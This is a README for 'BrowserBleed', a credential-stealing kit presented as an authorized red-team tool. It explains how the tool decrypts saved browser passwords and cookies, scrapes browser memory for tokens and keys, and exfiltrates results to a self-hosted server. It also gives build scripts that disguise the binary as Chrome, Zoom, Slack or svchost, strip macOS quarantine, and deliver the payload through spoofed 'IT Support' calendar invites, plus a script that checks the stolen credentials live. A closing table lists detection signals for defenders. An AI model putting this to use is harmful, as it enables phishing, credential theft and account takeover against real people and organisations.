# BrowserBleed

Authorized red team tool for extracting credentials, session tokens, and cookies from running Chromium-based and Firefox-family browsers. Supports Windows (`BrowserBleed.py` / `BrowserBleed.exe`), macOS (`BrowserBleed_mac.py` / `BrowserBleed_mac`), and Linux (`BrowserBleed_linux.py` / `BrowserBleed_linux`).

> **For authorized use only.** Only run against systems you own or have explicit written permission to test.

---

## Quick Start

```bash
# 1. Clone and install runtime dependency
git clone https://github.com/andrewhannaford/BrowserBleed && cd BrowserBleed
pip3 install cryptography

# 2. Deploy the report server (one time — needs AWS CLI + a domain in Route 53)
cp deploy/config.example deploy/config   # fill in DOMAIN, BB_API_KEY, ENCRYPTION_KEY
bash deploy/provision.sh                 # spin up EC2, configure nginx + TLS
bash deploy/setup-server.sh
bash deploy/deploy-binary.sh             # cross-compile and deploy the Go binary

# 3. Build a payload for your target platform and upload it to the server
.\build_windows.ps1 -Preset chrome -Upload    # Windows (PowerShell)
./build_mac.sh --preset chrome --upload       # macOS
sudo ./build_linux.sh --preset chrome --upload  # Linux

# 4. Deliver — copy the smart link from the Payloads page, or send via calendar invite
python3 invite.py --preset chrome \
    --from-name "IT Support" --from-email it@corp.com \
    --to target@corp.com --send \
    --provider gmail --smtp-user you@gmail.com --smtp-pass "app-password"

# 5. View results at your report server (log in with BB_API_KEY)

# 6. Validate live credentials from a results CSV
python3 sessiontest.py bb_results.csv
```

No flags needed on the target — when a server is baked in the binary exfils automatically and exits. See [Building your own binaries](#building-your-own-binaries) for full build options.

---

## Attack Overview

Modern browsers hold decrypted credentials, session tokens, JWTs, and auth cookies entirely in process memory during an active session. An attacker or red teamer with local administrator access (Windows) or root (macOS/Linux) can read the virtual address space of every browser process, extract live credentials without touching disk, and use them to impersonate the victim across any service whose tokens appear in memory — regardless of whether the user's disk is encrypted.

This attack is effective against:
- Corporate SSO sessions (Okta, Azure AD, Google Workspace)
- OAuth2 access and refresh tokens
- API keys stored by web apps (GitHub, Anthropic, OpenAI, Slack, HuggingFace, Stripe, npm)
- AWS access keys and session tokens
- Session cookies protected by HttpOnly and Secure flags (bypassed because we read them from memory, not the network)
- SSH private keys resident in memory

---

## How Each Script Works

### Windows - `BrowserBleed.py`

**Prerequisites:** Run as Administrator. Built with `--uac-admin` so Windows auto-elevates on launch.

#### 1. Disk Extraction

Chrome encrypts saved passwords and cookies on disk using **AES-256-GCM** with a master key protected by Windows **DPAPI** (`CryptUnprotectData`). Because we run as the same user, DPAPI decrypts transparently:

1. Read `Local State` JSON → base64-decode the encrypted master key blob
2. Call `CryptUnprotectData` (via `ctypes.windll.crypt32`) to unwrap the master key
3. Open `Login Data` (SQLite) → decrypt each `password_value` with AES-256-GCM using the master key
4. Open `Network/Cookies` (SQLite) → same decryption path for each cookie value

Chrome locks the Cookies file while running. Fallback: **VSS (Volume Shadow Copy)** snapshot to read a consistent copy of the locked file without touching Chrome's file handle.

Multi-profile aware: enumerates `Default`, `Profile 1`–`Profile 19`, and `Guest Profile` per browser.

#### 2. CDP Cookie Extraction

When Chrome is running, BrowserBleed always attempts **Chrome DevTools Protocol** cookie extraction alongside disk extraction. CDP surfaces session-only and HttpOnly cookies that never touch disk. Results are merged with disk cookies (deduped by host+name); CDP-only entries are labeled.

#### 3. Memory Scraping

For each Chrome PID (all processes - renderer, GPU, network service, browser):

1. `OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)` → get a handle
2. `VirtualQueryEx` → walk the virtual address space, enumerate all `MEM_COMMIT` regions that aren't `PAGE_NOACCESS`, `PAGE_GUARD`, or `MEM_IMAGE` (DLL/EXE code sections - skipped; no credentials live there)
3. **Pre-filter**: before running any regex, check each 64 KB chunk for known credential prefixes (`eyJ`, `Bearer `, `ghp_`, `sk-ant-`, `AKIA`, `-----BEGIN`, etc.) using C-speed `bytes.__contains__`. Skips ~85% of Chrome memory without regex overhead.
4. `ReadProcessMemory` → read each qualifying region in **64 KB chunks** (vs. 4 KB previously - 16× fewer syscalls)
5. Scan each chunk with `CREDENTIAL_PATTERNS` (20 regex patterns covering JWTs, Bearer tokens, OAuth tokens, API keys, session tokens, session IDs, cookies, passwords, SSH private keys)
6. **512-byte overlap**: retain the last 512 bytes of each chunk and prepend to the next. Prevents credentials split across chunk boundaries from being missed.
7. PIDs scraped in parallel via `ThreadPoolExecutor` (up to 8 workers)

#### 4. PID → Site Attribution

Chrome renderer processes expose `--site-instance-site=https://...` in their command line (one renderer per site origin under strict site isolation). A single `Get-WmiObject Win32_Process` batch query retrieves all Chrome command lines at once, building a `pid → site_url` map. The site URL is injected into each hit's context for service identification.

#### 5. Deduplication

Two-pass dedup:
1. **Prefix key**: group hits by `label:value[:50]` to collapse near-identical captures of the same token
2. **Prefix collapse**: within each label group, if a shorter value is a prefix of a longer one, keep the longer (handles chunk-boundary truncations)

#### 6. Service Identification

Each hit passes through a 6-level identification chain:

| Priority | Method | Example |
|----------|--------|---------|
| 1 | Token prefix patterns | `ya29.` → Google OAuth2, `ghp_` → GitHub |
| 2 | JWT header `kid` patterns | `key-\d+` → Google (empirical) |
| 3 | JWT `iss`/`aud` claims vs `_ISS_MAP` | `github.com` in iss → GitHub |
| 4 | OIDC discovery | Fetch `<iss>/.well-known/openid-configuration` |
| 5 | JWT claim URL scan | `redirect_uri` value → service domain |
| 6 | Context window byte scan | `Host: api.slack.com` near the token in memory |

#### 7. Token Verification (`--verify`)

Makes live outbound requests to verify token validity:

| Service | Endpoint |
|---------|----------|
| Google OAuth2 | `oauth2.googleapis.com/tokeninfo` |
| GitHub | `api.github.com/user` |
| Slack | `slack.com/api/auth.test` |
| Anthropic | `api.anthropic.com/v1/models` |
| OpenAI | `api.openai.com/v1/models` |
| Stripe | `api.stripe.com/v1/account` |
| AWS | `sts.amazonaws.com` (GetCallerIdentity) |
| JWT (generic) | Local `exp` claim check |

---

### macOS - `BrowserBleed_mac.py`

**Prerequisites:** Run as root (`sudo`). `task_for_pid` requires root or the `com.apple.security.cs.debugger` entitlement.

#### 1. Disk Extraction

Chrome on macOS encrypts cookies/passwords using **AES-128-CBC** with a key derived from a password stored in the **macOS Keychain**:

1. `security find-generic-password -w -s "Chrome Safe Storage" -a "Chrome"` → retrieve the Keychain password
2. Derive a 16-byte AES key: `PBKDF2-HMAC-SHA1(password, salt=b"saltysalt", iterations=1003, dklen=16)`
3. Decrypt each `v10`-prefixed value: strip the 3-byte `v10` prefix, use a fixed IV of 16 space bytes (`b" " * 16`), AES-128-CBC decrypt, strip PKCS#7 padding

Multi-profile aware: enumerates `Default`, `Profile 1`–`Profile 19`, and `Guest Profile` per browser.

Chrome v20+ uses app-bound encryption for cookies — these are labeled in output but not decryptable from outside the browser process.

#### 2. CDP Cookie Extraction

Same as Windows: attempts DevTools Protocol extraction when browser is running, merges with disk results, labels CDP-only entries.

#### 3. Memory Scraping

For each Chrome PID:

1. `task_for_pid(mach_task_self(), pid, &task)` → obtain a Mach task port for the target process
2. `mach_vm_region(task, &addr, &size, VM_REGION_BASIC_INFO_64, ...)` → iterate all readable memory regions (`VM_PROT_READ`)
3. **Pre-filter**: same C-speed prefix scan as Windows before running regex
4. `mach_vm_read_overwrite` → read each qualifying region in **64 KB chunks**
5. **512-byte overlap** between chunks
6. Same 20-pattern `CREDENTIAL_PATTERNS` scanning as Windows
7. PIDs scraped in parallel via `ThreadPoolExecutor` (up to 8 workers)

#### 4. PID → Site Attribution

Uses `ps -ww -A` to read Chrome process command lines and extract `--site-instance-site=URL` — same logic as Windows.

#### 5–7. Deduplication, Identification, and Verification

Identical to Windows: same two-pass dedup, same `_DOMAIN_SVC`, `_ISS_MAP`, `_KID_MAP`, OIDC discovery, context scanning, and verifiers.

#### Firefox family

macOS supports spec-driven extraction for Firefox, Firefox ESR, LibreWolf, Waterfox, and Tor Browser. Profile directories are deduped so browsers sharing the same directory (e.g. Firefox and Firefox ESR both use `~/Library/Application Support/Firefox`) aren't double-processed.

---

### Linux - `BrowserBleed_linux.py`

**Prerequisites:** Run as root (`sudo`). Memory reading requires either root or `ptrace_scope=0` (`/proc/sys/kernel/yama/ptrace_scope`). `SUDO_USER` is read to resolve the real user's home directory when running via `sudo`.

#### 1. Disk Extraction

Chrome on Linux encrypts cookies/passwords using **AES-128-CBC** (identical cipher to macOS, different parameters):

1. Retrieve the password from **GNOME SecretService** (`secret-tool lookup application chrome`) or **KWallet** (`kwallet-query`). Falls back to the hardcoded default `"peanuts"` if no keyring is available.
2. Derive a 16-byte AES key: `PBKDF2-HMAC-SHA1(password, salt=b"saltysalt", iterations=1, dklen=16)` — note **1 iteration** on Linux vs. 1003 on macOS
3. Decrypt each `v10`/`v11`-prefixed value: strip 3-byte prefix, AES-128-CBC with IV of 16 space bytes, strip PKCS#7 padding

Multi-profile aware: enumerates `Default`, `Profile 1`–`Profile 19`, and `Guest Profile` per browser.

#### 2. CDP Cookie Extraction

Same as Windows and macOS: DevTools Protocol extraction when browser is running, merged and deduped with disk results.

#### 3. Memory Scraping

For each Chrome PID:

1. Open `/proc/<pid>/maps` → parse all readable segments (lines containing `r` permission, excluding `vvar`, `vdso`, `vsyscall`)
2. Open `/proc/<pid>/mem` → seek to each mapped address and read
3. **Pre-filter**: same C-speed prefix scan before running regex
4. Read each qualifying region in **64 KB chunks** with **512-byte overlap**
5. Same 20-pattern `CREDENTIAL_PATTERNS` scanning
6. PIDs scraped in parallel via `ThreadPoolExecutor` (up to 8 workers)

#### 4. Snap / Flatpak awareness

All browser path candidates are checked in order — standard install, snap, flatpak — and the first existing directory wins:

| Install type | Example path |
|---|---|
| Standard | `~/.config/google-chrome` |
| Snap | `~/snap/google-chrome/current/.config/google-chrome` |
| Flatpak | `~/.var/app/com.google.Chrome/config/google-chrome` |

Ubuntu installs Firefox as a snap by default (`~/snap/firefox/common/.mozilla/firefox`). All Firefox-family browsers (Firefox, LibreWolf, Waterfox, Tor Browser) follow the same snap/flatpak resolution. Profile directories are deduped to avoid double-processing shared locations.

#### 5. Diagnostics block

Every report includes a `[DIAG]` section showing which browsers are installed and running at the time of execution:

```
  -- [DIAG] Browser paths --
  Google Chrome        INSTALLED  RUNNING (PIDs: 1234,1235,1236)
    path: /home/user/.config/google-chrome
  Firefox              INSTALLED  RUNNING (PIDs: 5678)
    path: /home/user/snap/firefox/common/.mozilla/firefox
  Brave                not found
  ...
```

This lets the operator immediately see what's on the target without needing shell access.

#### 6. PID → Site Attribution, Deduplication, and Identification

Uses `/proc/<pid>/cmdline` to extract `--site-instance-site=URL` from Chrome renderer processes. Deduplication and service identification are identical to Windows and macOS.

---

## Output

All versions write two files to the same directory as the binary:

| File | Contents |
|------|----------|
| `bb_results.txt` | Human-readable report. Memory hits formatted as an aligned flat table sorted by credential tier (high-value first). Values truncated at 80 chars for readability. Session IDs and Cookie headers collapsed to a count summary. Includes `[DIAG]` block showing browser install/running state. |
| `bb_results.csv` | Full untruncated values for all memory hits plus disk credentials and cookies. Columns: `browser, profile, label, service, value, address`. Import directly into Excel or Sheets for sorting/filtering. |

---

## Usage

When built with a report server baked in (see [Building your own binaries](#building-your-own-binaries)), just drop and run — no flags needed. Results upload automatically.

**Default behaviour when a server is baked in (Windows and macOS):**
1. Scans all browsers (disk + memory), exfils results to your server
2. No local files left anywhere on the target

**Linux does not self-delete** — the binary stays on disk after running. Remove it manually as part of your cleanup.

### Windows

```
chrome_crashpad_handler.exe             # drop and run - exfils
chrome_crashpad_handler.exe --out results.txt  # also write a local file
chrome_crashpad_handler.exe --browser chrome   # target one browser only
chrome_crashpad_handler.exe --memory-only      # skip disk extraction
chrome_crashpad_handler.exe --disk-only        # skip memory scraping
chrome_crashpad_handler.exe --verify           # verify tokens (outbound requests)
chrome_crashpad_handler.exe --max-hits 500     # lower memory hit cap (default: 1000)
```

When running from source (no server baked in):
```
python BrowserBleed.py --exfil https://your-server.com --exfil-key YOUR_API_KEY
```

### macOS

```bash
sudo ./BrowserBleed_mac                        # drop and run - exfils
sudo ./BrowserBleed_mac --out /tmp/results.txt # also write a local file
sudo ./BrowserBleed_mac --browser chrome       # target one browser only
sudo ./BrowserBleed_mac --memory-only          # skip disk extraction
sudo ./BrowserBleed_mac --disk-only            # skip memory scraping
sudo ./BrowserBleed_mac --verify               # verify tokens (outbound requests)
sudo ./BrowserBleed_mac --max-hits 500         # lower memory hit cap (default: 300)
```

When running from source:
```bash
sudo python3 BrowserBleed_mac.py --exfil https://your-server.com --exfil-key YOUR_API_KEY
```

### Linux

```bash
sudo ./google-chrome                           # drop and run - exfils
sudo ./google-chrome --out /tmp/results.txt    # also write a local file
sudo ./google-chrome --browser chrome          # target one browser only
sudo ./google-chrome --memory-only             # skip disk extraction
sudo ./google-chrome --disk-only               # skip memory scraping
sudo ./google-chrome --verify                  # verify tokens (outbound requests)
sudo ./google-chrome --max-hits 500            # raise memory hit cap (default: 300)
```

When running from source:
```bash
sudo python3 BrowserBleed_linux.py --exfil https://your-server.com --exfil-key YOUR_API_KEY
```

### Credential Validation — `sessiontest.py`

Reads a `bb_results.csv` produced by any extractor and tests each credential live against its service. No extra dependencies — stdlib only (Playwright optional for cookie replay).

```bash
python3 sessiontest.py                      # auto-discovers bb_results.csv in cwd
python3 sessiontest.py /path/to/results.csv # explicit path
python3 sessiontest.py --json               # machine-readable JSON output
python3 sessiontest.py --delay 1.0          # add delay between requests (rate limiting)
python3 sessiontest.py --timeout 30         # per-request timeout in seconds (default: 10)
python3 sessiontest.py --no-verify-ssl      # skip TLS verification
python3 sessiontest.py --browser            # replay session cookies via Playwright
                                            # (requires: pip3 install playwright &&
                                            #            python3 -m playwright install chromium)
```

Supported checks:

| Credential type | What's verified |
|-----------------|-----------------|
| GitHub token (`ghp_`, `gho_`, etc.) | Identity, email, org membership, private repo access |
| Google OAuth2 (`ya29.`) | Token validity, account email |
| Slack token (`xoxb-`, `xoxp-`, etc.) | Team, user, token type |
| Anthropic API key | Validity, available models |
| OpenAI API key | Validity, available models |
| HuggingFace token | Identity, org membership |
| Stripe key | Account, live vs. test mode |
| npm token | Identity |
| AWS access key | Caller identity via STS (SigV4 signed) |
| JWT | Expiry check, issuer identification |
| Session cookies | HTTP probe against known endpoints (GitHub, Google, Slack, Discord, Twitter/X) |

---

## Report Server

BrowserBleed includes a self-hosted report server (`server/`) for receiving results, managing payloads, and delivering them to targets. When `--exfil` is used, BrowserBleed POSTs the `.txt` and `.csv` to the server after the run; the report URL is appended to `bb_results.txt`.

### Security model

The server is designed to handle highly sensitive data. Three layers of protection are applied:

| Layer | Mechanism |
|-------|-----------|
| **Encryption at rest** | Every report is encrypted with AES-256-GCM before touching disk. A separate `ENCRYPTION_KEY` (distinct from the API key) is used. `.enc` files only — no plaintext ever written. `meta.json` (hostname, timestamps, hit count — no credential values) is stored unencrypted for index building. |
| **Auth** | Browser access via `POST /login` form → HttpOnly session cookie (no query params, never in logs). Programmatic upload via `Authorization: Bearer` header only. `/login` has `access_log off` in nginx so the key is never logged. |
| **Auto-expiry** | Reports are deleted after a configurable TTL (default 24h). A background goroutine runs every 15 minutes. Expiry time is shown in the report view. |

> **Honest limitation:** If the EC2 is fully compromised with root access, an attacker can read `ENCRYPTION_KEY` from `/opt/bb-reports/.env` and decrypt stored reports. The TTL limits the blast radius to whatever was uploaded in the last day.

### Deploying the report server

Prerequisites: AWS CLI authenticated, Route 53 hosted zone for your domain, Go 1.22+.

```bash
# 1. Configure your deployment
cp deploy/config.example deploy/config
# Edit deploy/config with your domain, email, region, etc.

# 2. Spin up the EC2 instance
bash deploy/provision.sh

# 3. Wait ~60s, then configure nginx + TLS
bash deploy/setup-server.sh

# 4. Build and deploy the server binary
bash deploy/deploy-binary.sh
```

`setup-server.sh` creates `/opt/bb-reports/.env` (mode 600) on the server from the values in `deploy/config`:

| Variable | Purpose |
|----------|---------|
| `API_KEY` | Shared between BrowserBleed `--exfil-key` and the browser login form |
| `ENCRYPTION_KEY` | 64-char hex AES-256 key — generate with `openssl rand -hex 32` |
| `BASE_URL` | Public URL of the server (e.g. `https://reports.yourdomain.com`) |
| `REPORT_TTL` | How long reports are kept (e.g. `24h`, `72h`) |

To update the binary after code changes:
```bash
bash deploy/deploy-binary.sh   # rebuilds, uploads, restarts service
```

### Server endpoints

| Path | Auth | Description |
|------|------|-------------|
| `GET /` | Required | Reports index |
| `POST /login` | — | Browser login (sets session cookie) |
| `POST /upload` | Bearer | Receive payload report (called by the binary) |
| `GET /r/{id}` | Required | View report |
| `POST /r/{id}/delete` | Required | Delete single report |
| `POST /r/delete-bulk` | Required | Delete multiple reports — JSON `{"ids":[...]}` |
| `GET /r/export-bulk` | Required | Export reports as zip — query `?ids=...` |
| `GET /payloads` | Required | Payload manager + build command generator |
| `POST /payloads` | Required | Upload payload file |
| `GET /payloads/{name}` | Required | Download payload file |
| `POST /payloads/{name}/delete` | Required | Delete payload file |
| `GET /p/{preset}` | **None** | Smart delivery — detects visitor OS, serves matching payload |
| `GET /builds` | Required | List build queue (JSON) |
| `POST /builds` | Required | Queue a new Windows build job |
| `POST /builds/claim` | Bearer | Build agent: claim the next pending job |
| `GET /builds/{id}/icon` | Bearer | Build agent: download custom icon for a job |
| `POST /builds/{id}/complete` | Bearer | Build agent: upload completed exe |
| `POST /builds/{id}/fail` | Bearer | Build agent: report a build failure |
| `POST /builds/{id}/delete` | Required | Remove a job from the queue |
| `GET /invite/config` | Required | Get email delivery config (SMTP settings) |
| `POST /invite/config` | Required | Save email delivery config |
| `POST /invite/send` | Required | Send a calendar invite via email |
| `GET /auth/status` | Required | OAuth connection status (Gmail / Outlook) |
| `GET /auth/{provider}/connect` | Required | Start OAuth flow |
| `GET /auth/{provider}/callback` | — | OAuth redirect handler |
| `POST /auth/{provider}/disconnect` | Required | Remove stored OAuth token |

`/p/{preset}` is intentionally unauthenticated — it goes inside ICS invites sent to targets.

---

## Targeting & Delivery

### Smart delivery links

Every uploaded payload automatically gets a smart delivery URL:

```
https://reports.yourserver.com/p/chrome
https://reports.yourserver.com/p/slack
```

When a target visits the link, the server reads their `User-Agent` and serves the right binary:
- **Windows** → serves the disguised `.exe` (download name: `chrome_crashpad_handler.exe`)
- **macOS** → serves the Mac binary (download name: `Google Chrome Helper`)
- **Linux** → serves the Linux binary (download name: `google-chrome`)

One link works for all three platforms. Smart links are shown in the Payloads UI next to each uploaded file, and are embedded automatically by both `invite.py` and the web-based invite builder.

### Calendar invites

Deliver the smart link inside a convincing calendar invite. Two ways to generate:

**CLI — `invite.py`:**
```bash
python3 invite.py --preset chrome \
    --from-name "Sarah Johnson" --from-email sarah@company.com \
    --to target@target.example.com

# Multiple recipients, Teams disguise:
python3 invite.py --preset teams \
    --from-name "IT Support" --from-email it@company.com \
    --to alice@target.example.com --to bob@target.example.com \
    --subject "Mandatory Security Training" --disguise teams \
    --date "2026-07-01 09:00"

# Send directly via email (requires --send and SMTP/OAuth config):
python3 invite.py --preset zoom --send \
    --from-name "HR" --from-email hr@company.com \
    --to target@target.example.com
```

Available disguises: `zoom` (default for most presets), `teams`, `google-meet`, `generic`

**Web UI** — the Payloads page has a built-in invite builder with the same options, a live preview of the invite description, and a Download ICS button. Configure email delivery in the Email Settings section to send directly from the browser.

### Email delivery

The server supports sending invites directly via:

| Method | Setup |
|--------|-------|
| **Gmail OAuth** | Click "Connect Gmail" in Email Settings → authorises via Google OAuth 2.0 → no password stored |
| **Outlook OAuth** | Click "Connect Outlook" → authorises via Microsoft identity platform → no password stored |
| **Custom SMTP** | Enter host/port/credentials → works with any SMTP relay |

OAuth tokens are stored encrypted at rest using the same `ENCRYPTION_KEY` as reports. Tokens are refreshed automatically.

### Build agent

To build Windows payloads remotely from a Windows machine without local Go/Python:

```
python build_agent.py --server https://reports.yourserver.com --key YOUR_API_KEY
```

Keep this running on your Windows build machine. Queue builds from the Payloads UI (Build Command section → "Queue build on agent"), and the agent picks them up, runs `build_windows.ps1`, and uploads the `.exe` automatically. Supports custom icons and company metadata per job.

---

## Building your own binaries

Binaries are **not distributed** — you build your own with your report server baked in. This keeps your server URL and API key out of any shared binary and off GitHub.

### Prerequisites

```
pip install cryptography pyinstaller   # Windows (PowerShell)
pip3 install cryptography pyinstaller  # macOS
```

Linux dependencies (Python 3.10+, cryptography, pyinstaller, binutils) are installed automatically by `build_linux.sh`.

Go 1.22+ is required only to build the report server binary.

### Step 1 - Deploy the report server

Follow the [Report Server](#report-server) deploy steps above. When done, `deploy/config` will contain your `DOMAIN` and `BB_API_KEY`.

### Step 2 - Build for Windows

```powershell
.\build_windows.ps1
```

Reads `DOMAIN` and `BB_API_KEY` from `deploy/config`, substitutes them into a temp copy of the source, and produces the exe in the repo root. The exe auto-exfils on every run — no flags needed on target.

**Disguising the binary** — use `-Preset` to pick a disguise, or run without arguments for an interactive menu:

```powershell
.\build_windows.ps1           # interactive menu to pick a preset
.\build_windows.ps1 -Preset chrome
.\build_windows.ps1 -Preset slack
.\build_windows.ps1 -Preset teams
.\build_windows.ps1 -Preset chrome -Upload   # build and upload to payload server
```

Available presets (set exe name, process name, icon, and Properties metadata automatically):

| # | Preset | Exe on disk | Download name (smart link) | Company / description |
|---|--------|-------------|----------------------------|-----------------------|
| 1 | `chrome` | `chrome.exe` | `chrome_crashpad_handler.exe` | Google LLC - Google Chrome |
| 2 | `edge` | `edge.exe` | `msedge_crashpad_handler.exe` | Microsoft Corporation - Microsoft Edge |
| 3 | `brave` | `brave.exe` | `brave_crashpad_handler.exe` | Brave Software, Inc - Brave Browser |
| 4 | `firefox` | `firefox.exe` | `plugin-container.exe` | Mozilla Corporation - Mozilla Firefox |
| 5 | `opera` | `opera.exe` | `opera_crashpad_handler.exe` | Opera Software AS - Opera internet browser |
| 6 | `slack` | `slack.exe` | `slack.exe` | Slack Technologies, Inc. - Slack |
| 7 | `discord` | `discord.exe` | `Discord.exe` | Discord Inc. - Discord |
| 8 | `teams` | `ms-teams.exe` | `ms-teams.exe` | Microsoft Corporation - Microsoft Teams |
| 9 | `zoom` | `zoom.exe` | `Zoom.exe` | Zoom Video Communications, Inc. - Zoom |
| 10 | `whatsapp` | `whatsapp.exe` | `WhatsApp.exe` | WhatsApp LLC - WhatsApp |
| 11 | `telegram` | `telegram.exe` | `Telegram.exe` | Telegram FZ-LLC - Telegram Desktop |

"Exe on disk" is the file stored in the payload server and on the build machine. "Download name" is what the target's browser saves when they click the smart link — a more plausible helper process name.

Icons are pulled automatically from the app's install path if it's installed on the build machine. If the app isn't installed, the binary is built without a custom icon.

**Full manual override** (for any process name not in the presets):

```powershell
.\build_windows.ps1 `
    -ExeName svchost `
    -Company "Microsoft Corporation" `
    -FileDesc "Host Process for Windows Services" `
    -IconFile "C:\Windows\System32\svchost.exe" `
    -ExfilUrl https://reports.example.com `
    -ExfilKey mykey
```

### Step 3 - Build for macOS

```bash
chmod +x build_mac.sh && ./build_mac.sh
```

Reads `DOMAIN` and `BB_API_KEY` from `deploy/config`, patches a temp copy of `BrowserBleed_mac.py`, builds via PyInstaller, and strips the Gatekeeper quarantine attribute automatically. Requires Python 3.10+ (install via Homebrew: `brew install python@3.12`).

**Disguising the binary** — use `--preset` to pick a disguise, or run without arguments for an interactive menu:

```bash
./build_mac.sh --preset chrome
./build_mac.sh --preset firefox
./build_mac.sh --preset slack
```

Available presets:

| # | Preset | Binary on disk | Download name (smart link) | Process in Activity Monitor |
|---|--------|----------------|----------------------------|-----------------------------|
| 1 | `chrome` | `google-chrome` | `Google Chrome Helper` | google-chrome |
| 2 | `edge` | `microsoft-edge` | `Microsoft Edge Helper` | microsoft-edge |
| 3 | `brave` | `brave-browser` | `Brave Browser Helper` | brave-browser |
| 4 | `firefox` | `firefox` | `Firefox` | firefox |
| 5 | `opera` | `opera` | `Opera Helper` | opera |
| 6 | `slack` | `slack` | `Slack Helper` | slack |
| 7 | `discord` | `discord` | `Discord Helper` | discord |
| 8 | `teams` | `teams` | `Microsoft Teams Helper` | teams |
| 9 | `zoom` | `zoom` | `ZoomHelper` | zoom |
| 10 | `whatsapp` | `whatsapp-desktop` | `WhatsApp Helper` | whatsapp-desktop |
| 11 | `telegram` | `telegram-desktop` | `Telegram Desktop` | telegram-desktop |

The macOS binary is a single universal extractor — all presets produce the same `BrowserBleed_mac.py` code, just named and disguised differently. Upload any one of them; the smart link will serve it for all macOS visitors with the appropriate download name.

Custom binary name:
```bash
./build_mac.sh --name helper-agent
```

To point at a different server without `deploy/config`:
```bash
EXFIL_URL=https://reports.example.com EXFIL_KEY=mykey ./build_mac.sh --preset chrome
```

If you move or re-download the binary, re-strip quarantine:
```bash
xattr -dr com.apple.quarantine google-chrome
```

### Step 4 - Build for Linux

```bash
chmod +x build_linux.sh && sudo ./build_linux.sh
```

The script installs all dependencies automatically (Python 3.10+, `cryptography`, `pyinstaller`, `binutils`) using the system package manager (`apt`, `dnf`, `yum`, `pacman`, or `zypper`). A venv is created at `~/.bb_build_env/` to avoid PEP 668 restrictions on Ubuntu 23.04+/Debian 12+.

Reads `DOMAIN` and `BB_API_KEY` from `deploy/config`, patches a temp copy of the source, and produces a standalone binary via PyInstaller. The binary name (and process name in `ps`/`top`) matches the chosen preset.

**Disguising the binary** — use `--preset` to pick a disguise, or run without arguments for an interactive menu:

```bash
sudo ./build_linux.sh --preset chrome
sudo ./build_linux.sh --preset firefox
sudo ./build_linux.sh --preset slack
```

Available presets:

| # | Preset | Binary name | Blends in as |
|---|--------|-------------|--------------|
| 1 | `chrome` | `google-chrome` | Google Chrome process |
| 2 | `edge` | `microsoft-edge` | Microsoft Edge process |
| 3 | `brave` | `brave-browser` | Brave Browser process |
| 4 | `firefox` | `firefox` | Mozilla Firefox process |
| 5 | `opera` | `opera` | Opera process |
| 6 | `slack` | `slack` | Slack process |
| 7 | `discord` | `discord` | Discord process |
| 8 | `teams` | `teams` | Microsoft Teams process |
| 9 | `zoom` | `zoom` | Zoom process |
| 10 | `whatsapp` | `whatsapp-desktop` | WhatsApp Desktop process |
| 11 | `telegram` | `telegram-desktop` | Telegram Desktop process |

Custom binary name (any string you want in `ps`):
```bash
sudo ./build_linux.sh --name systemd-helper
```

Build and upload to the payload server in one step:
```bash
sudo ./build_linux.sh --preset chrome --upload
```

To point at a different server without `deploy/config`:
```bash
EXFIL_URL=https://reports.example.com EXFIL_KEY=mykey sudo -E ./build_linux.sh --preset chrome
```

### Dropping on a target

Drop the built binary anywhere writable on the target and run it.

```
chrome_crashpad_handler.exe   # Windows - exfils, no local files
sudo ./BrowserBleed_mac       # macOS - exfils, no local files
sudo ./google-chrome          # Linux - exfils, stays on disk
```

View results at your report server after logging in with the API key.

### Rebuilding after source changes

Re-run the build script — it always patches a temp copy, so the source files stay clean (no credentials in the `.py` files ever):
```powershell
.\build_windows.ps1 -Preset chrome   # or whichever preset you use
```

### Report server binary (local dev/test)

```bash
cd server
go run ./cmd/server -- --api-key testkey --enc-key $(openssl rand -hex 32) --data-dir /tmp/bb-data --base-url http://localhost:8080
```

---

## Supported Browsers

### Chromium-based (all platforms)

| Browser | Windows | macOS | Linux |
|---------|---------|-------|-------|
| Google Chrome | ✓ | ✓ | ✓ (standard, snap, flatpak) |
| Microsoft Edge | ✓ | ✓ | ✓ (standard, snap, flatpak) |
| Brave | ✓ | ✓ | ✓ (standard, snap, flatpak) |
| Chromium | ✓ | ✓ | ✓ (standard, snap, flatpak) |
| Vivaldi | ✓ | ✓ | ✓ (standard, flatpak) |
| Opera | ✓ | ✓ | ✓ (standard, snap, flatpak) |
| Opera GX | ✓ | — | — (Windows/Mac only) |
| Yandex Browser | ✓ | ✓ | ✓ |

### Firefox-based (all platforms)

Disk extraction reads unencrypted `cookies.sqlite` from each browser's profile. Login credential decryption (`logins.json` / NSS) is not yet implemented.

| Browser | Windows | macOS | Linux |
|---------|---------|-------|-------|
| Firefox | ✓ | ✓ | ✓ (standard, snap, flatpak) |
| Firefox ESR | ✓ | ✓ | ✓ |
| LibreWolf | ✓ | ✓ | ✓ (standard, snap, flatpak) |
| Waterfox | ✓ | ✓ | ✓ (standard, flatpak) |
| Tor Browser | ✓ | ✓ | ✓ |

All Firefox-family browsers are deduped — if two browsers share the same profile directory, it's only processed once.

---

## Development & Testing

```bash
# Install dependencies
pip3 install cryptography pytest

# Run the test suite (412 tests — covers all three extractors + sessiontest.py)
python3 -m pytest tests.py -v

# Windows API tests (process enumeration, memory scraping) are automatically
# skipped on Linux/macOS. Playwright tests require:
#   pip3 install playwright && python3 -m playwright install chromium
```

CI runs automatically on every push and PR via GitHub Actions (`.github/workflows/tests.yml`).

---

## Detection Opportunities

For blue teamers: this tool generates detectable signals at each stage.

| Stage | Signal |
|-------|--------|
| Memory read (Windows) | `OpenProcess` calls from a non-browser process targeting Chrome PIDs |
| Memory read (macOS) | `task_for_pid` calls from a non-browser process targeting Chrome PIDs |
| Memory read (Linux) | `/proc/<pid>/mem` opens from a process not belonging to the browser user |
| VSS access (Windows) | `IVssBackupComponents::InitializeForBackup` from a non-backup process |
| Disk credential read | SQLite open on `Login Data` / `Cookies` / `cookies.sqlite` from a process that isn't the browser |
| CDP connection | WebSocket connection to `localhost:9222` from a non-browser process |
| Outbound verification | HTTP requests to `oauth2.googleapis.com/tokeninfo`, `api.github.com/user`, `slack.com/api/auth.test`, `api.anthropic.com/v1/models` from a non-browser process |
| OIDC discovery | Unexpected `GET /.well-known/openid-configuration` from a non-browser process |

EDR products with process injection detection (CrowdStrike, SentinelOne, Defender for Endpoint) will typically alert on cross-process memory reads targeting a browser. On Linux, `auditd` rules on `/proc/*/mem` access will catch this tool.
